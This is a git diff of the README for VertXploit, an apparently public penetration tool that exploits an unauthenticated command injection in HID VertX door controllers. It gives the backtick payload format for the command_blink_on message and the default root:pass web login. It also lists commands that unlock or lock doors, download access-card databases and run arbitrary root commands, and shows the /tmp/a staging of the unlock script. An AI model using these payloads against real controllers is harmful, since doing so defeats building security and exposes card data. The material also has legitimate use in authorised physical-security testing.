@@ -1,29 +1,73 @@
 # VertXploit
-Command Injection on HID VertX and Edge Door Controllers
+Exploiting HID VertX physical access control systems
 
 ## Summary ##
-Originally disclosed by Ricky "HeadlessZeke" Lawshae of Trend Micro DVLabs
+VertXploit is a tool that can be used to exploit HID VertX Edge and EVO access control systems. 
 
-This vulnerability allows remote attackers to execute arbitrary code on VertX, Edge, and EVO HID access control panels. Authentication is not required to exploit this vulnerability.
+A vulnerability exists within the discoveryd service, which fails to sanitize user data before executing system calls. This allows for arbitrary code execution on HID VertX Edge and EVO access control systems without needing to be authenticated. See the [Command Injection](https://github.com/coldfusion39/VertXploit/blob/master/README.md#command-injection) section for more information.
 
-The specific flaw exists within the discoveryd service. The issue lies in the failure to sanitize user data before executing a system call. An attacker could leverage this vulnerability to execute code with root privileges.
+VertXploit can unlock or lock doors connected to the access control system, download the databases containing all of the provisioned/cached access control cards, and execute arbitrary commands as root on the VertX system, if vulnerable.
 
-The actual location of the command injection is in the `command_blink_on` command. Normally, the command string would terminate with the number of times the VertX controller light should blink, in this case 30 times. 
+If the VertX controller's firmware has been recently updated, vertXploit will attempt to unlock or lock the doors through the web console by using the default, or user supplied, username and password.
+
+
+## Requirements ##
+Run `pip install -r requirements.txt` to install the required python modules.
+ * [netifaces](https://bitbucket.org/al45tair/netifaces)
+ * [python-nmap](https://bitbucket.org/xael/python-nmap)
+
+
+## Usage ##
+If the `-i IP` argument is not provided, vertXploit will attempt to discover all VertX access control system on the local network. If a controller is found, vertXploit will continue to execute the user supplied action that was provided with the `-a [discover, unlock, lock, download]` or `-raw` arguments.
+
+### Discover ###
+Run vertXploit with just the `-a discover` argument to discover all VertX access control systems on the local network. To check a specific system and return detailed information, run vertXploit with the `-a discover` argument and an IP address `-i IP`.
+
+Example:
+
+`./vertXploit.py`
+
+`./vertXploit.py -i 10.1.10.5`
+
+
+### Unlock/Lock ###
+In order to unlock or lock doors connected to a VertX access control system, run vertXploit with the `-a unlock` or `-a lock` arguments. If the controller is not vulnerable to the command injection exploit, vertXploit will attempt to unlock or lock the doors through the web console. This method uses the default username and password of 'root:pass', or you can supply your own with the `--username USERNAME` and `--password PASSWORD` arguments.
+
+Example:
+
+`./vertXploit.py -a unlock -i 10.1.10.5`
+
+
+### Download ###
+To download the VertX card databases, run vertXploit with the `-a download` argument. The controller must be vulnerable to the command injection exploit.
+
+Example:
+
+`./vertXploit.py -a download -i 10.1.10.5`
+
+
+### Raw ###
+Arbitrary Linux commands can be executed on a VertX access control system by using the `-raw COMMAND` argument. Depending on the command being sent, the controller may not be able to execute the command because it is not installed (i.e. Python, PERL, ruby, etc). As a simple proof of concept, the Linux 'ping' command seems to work on all VertX models tested.
+
+Example:
+
+`./vertXploit.py -raw 'ping -c 5 10.1.10.39' -i 10.1.10.5`
+
+
+## Command Injection ##
+Typically multiple VertX controllers are installed and housed together. The diagnostic command `command_blink_on` can be sent to a specific controller, which causes the panel's physical "Comm" LED to blink on and off for visual identification. This command usually terminates with the number of times the LED should blink, in the following case, 30 times.
 
 `command_blink_on;042;<MAC_ADDRESS>;30;`
 
-By replacing the number of blinks with a Linux command and wrapping it in back ticks, the command will get executed by the controller.
+By replacing the number of blinks with a Linux command wrapped in back ticks, the command will be executed on the VertX controller, as root.
 
-``command_blink_on;042;<MAC_ADDRESS>;`ping -c 5 192.168.0.39`;``
+``command_blink_on;042;<MAC_ADDRESS>;`ping -c 5 10.1.10.39`;``
 
-## Usage ##
-The only requirement is the IP address of an un-patched HID VertX door controller. The device itself uses UDP port 4070 by default.
+To remotely unlock and lock doors connected to the VertX access control system, commands are echoed to `/tmp/a`. This is done because there is a length limit of 22 characters, for each command, that can be sent to the controller. <i>Note: echo is used instead of printf because some older VertX controllers are running BusyBox < 1.0.1 which does not include printf.</i>
 
-Running the script without specifying a raw payload, `--raw`, or action, `--action`, will attempt to fingerprint the VertX controller and return version information.
+Newlines from echoing the commands into the file are then removed by running `tr -d '\n' < /tmp/a > /tmp/b` and intentional newlines are inserted by running `tr '!' '\n' < /tmp/b > /tmp/a`.
 
-To remotely unlock and lock doors connected to the VertX controller commands are echoed to `/tmp/a`. This is done because there is a length limit of how many characters can be sent to the controller. <i>Note: echo is used instead of printf because some older VertX controllers are running BusyBox < 1.0.1 which does not include printf.</i>
-
-Newlines from echoing the commands into the file are then removed by running `tr -d '\n' < /tmp/a > /tmp/b` and intentional newlines are inserted by running `tr '!' '\n' < /tmp/b > /tmp/a`. The script `/tmp/a` is then executed and both files are deleted. Below shows what commands are being echoed into `/tmp/a` for sending the unlock and lock the commands to the VertX controller
+The script `/tmp/a` is then executed and both files are deleted. Below shows what commands are being echoed into `/tmp/a` when the unlock and lock commands are sent to the VertX controller.
 
 ### Unlock ###
 	# Set QUERY_STRING to the door unlock value
@@ -45,27 +89,6 @@ Newlines from echoing the commands into the file are then removed by running `tr
 	# Run 'diagnostics_execute.cgi' script
 	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi
 
-### Raw Payload ###
-Depending on what payload is being sent, the VertX system may not be able to execute the command because it is not installed (i.e. Python, PERL, ruby, etc). As a simple proof of concept, the Linux 'ping' command seems to work on all VertX models tested.
-
-
-## Examples ##
-
-###### Fingerprint a VertX controller
-
-`python vertXploit.py -i 192.168.0.5`
-
-###### Unlock doors connected to the VertX controller
-
-`python vertXploit.py -i 192.168.0.5 --action unlock`
-
-###### Lock doors connected to the VertX controller
-
-`python vertXploit.py -i 192.168.0.5 --action lock`
-
-###### Execute the command 'ping -c 5 192.168.0.39'
-
-`python vertXploit.py -i 192.168.0.5 ping -c 5 192.168.0.39`
 
 
 ## Resources ##
